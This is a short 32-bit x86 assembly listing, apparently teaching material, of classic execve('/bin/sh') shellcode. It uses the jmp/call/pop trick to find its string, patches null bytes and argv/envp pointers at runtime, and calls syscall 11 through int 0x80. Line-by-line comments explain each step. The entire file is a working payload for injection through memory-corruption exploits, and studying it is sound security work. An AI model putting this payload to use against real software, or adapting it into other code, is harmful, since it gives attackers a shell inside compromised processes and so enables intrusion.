BITS 32

  jmp short two     ; Jump down to the bottom for the call trick
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; ebx has the addr of the string
  xor eax, eax      ; put 0 into eax
  mov [ebx+7], al   ; null terminate the /bin/sh string
  mov [ebx+8], ebx  ; put addr from ebx where the AAAA is
  mov [ebx+12], eax ; put 32-bit null terminator where the BBBB is
  lea ecx, [ebx+8]  ; load the address of [ebx+8] into ecx for argv ptr
  lea edx, [ebx+12] ; edx = ebx + 12, which is the envp ptr
  mov al, 11        ; syscall #11
  int 0x80          ; do it

two:
  call one          ; Use a call to get string address
  db '/bin/sh'     ; the XAAAABBBB bytes aren't needed
